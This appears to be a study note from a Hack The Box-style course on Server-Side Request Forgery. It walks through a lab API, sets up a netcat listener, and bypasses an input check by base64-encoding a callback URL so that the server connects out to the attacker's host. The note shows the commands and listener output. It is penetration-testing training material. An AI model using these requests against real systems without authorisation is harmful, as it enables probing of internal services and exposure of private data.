---
title: e-SSRF
draft: false
tags:
  - ssrf
---
Server-Side Request Forgery (SSRF) attacks, listed in the OWASP top 10, allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. We usually need to supply or modify URLs used by the target application to read or submit data. Exploiting SSRF vulnerabilities can lead to:

- Interacting with known internal systems
- Discovering internal services via port scans
- Disclosing local/sensitive data
- Including files in the target application
- Leaking NetNTLM hashes using UNC Paths (Windows)
- Achieving remote code execution

> Suppose we are assessing such an API residing in `http://<TARGET IP>:3000/api/userinfo`.

Let us first interact with it.

```shell-session
jadu101@htb[/htb]$ curl http://<TARGET IP>:3000/api/userinfo
{"success":false,"error":"'id' parameter is not given."}
```

API is expecting a parameter `id`. 

Since we are assessing for SSRF currently, we will first set up Netcat listener:

```shell-session
jadu101@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...
```

Now let's try the following command, pointing towards our listener:

```shell-session
jadu101@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:<LISTENER PORT>"
{"success":false,"error":"'id' parameter is invalid."}
```

We notice an error about the _id_ parameter being invalid, and we also notice no connection being made to our listener.

Let's try base64 encoding and sending it again:

```shell-session
jadu101@htb[/htb]$ echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
jadu101@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
```

When you make the API call, you will notice a connection being made to your Netcat listener. The API is vulnerable to SSRF.

```shell-session
jadu101@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 50542
GET / HTTP/1.1
Accept: application/json, text/plain, */*
User-Agent: axios/0.24.0
Host: <VPN/TUN Adapter IP>:4444
Connection: close
```

As time allows, try to provide APIs with input in various formats/encodings.

